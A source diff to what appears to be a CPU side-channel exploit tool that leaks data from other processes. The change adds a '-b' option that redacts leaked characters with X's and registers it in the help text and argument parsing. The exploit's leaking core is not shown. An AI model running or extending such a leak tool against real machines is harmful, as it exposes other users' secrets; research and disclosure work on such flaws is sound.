@@ -36,6 +36,7 @@ static uint64_t maxleak;
 
 static bool asciionly = true;
 static bool secretonly = false;
+static bool blind = false;
 
 // Minor variations in alignment seem to make the exploit work better on
 // different SKUs. These are some variants to try and see what works best.
@@ -101,10 +102,10 @@ static void * thread_leak_consumer(void *param)
 
             // Escape any confusing characters
             if (*s == '"' || *s == '\\')
-                fputc('\\', stdout);
+               if (!blind) fputc('\\', stdout);
             // Print normal ascii.
             if (isalnum(*s) || ispunct(*s)) {
-                fputc(*s, stdout);
+                if (!blind) fputc(*s, stdout); else fputc('X',stdout);
             } else if (isspace(*s)) {
                 fputc(' ', stdout);
             } else {
@@ -232,6 +233,7 @@ static void print_help()
     logmsg("   -t N    Give up after this many seconds.");
     logmsg("   -n N    Set nice level, can improve results on some systems.");
     logmsg("   -a      Print all data, not just ASCII strings.");
+    logmsg("   -b      Redact output data with X's.");
     logmsg("   -s      Only print the magic hammer value (used for benchmarking).");
     logmsg("   -p STR  Pattern mode, try to continue string STR based on sampling leaked values.");
     logmsg("   -q      Quiet, reduce verbosity.");
@@ -258,7 +260,7 @@ int main(int argc, char **argv) {
     pattern   = 0;        // String to search for.
     cores     = 0;        // Which cpus to run on.
 
-    while ((opt = getopt(argc, argv, "r:qp:sat:n:hH:c:v:m:")) != -1) {
+    while ((opt = getopt(argc, argv, "r:qbp:sat:n:hH:c:v:m:")) != -1) {
         switch (opt) {
             case 'v': variant = atoi(optarg);
                       break;
@@ -279,6 +281,8 @@ int main(int argc, char **argv) {
             case 'p': pattern = optarg;
                       break;
             case 'q': quiet = true;
+                      break;
+            case 'b': blind = true;
                       break;
             case 'r': cores = optarg;
                       break;
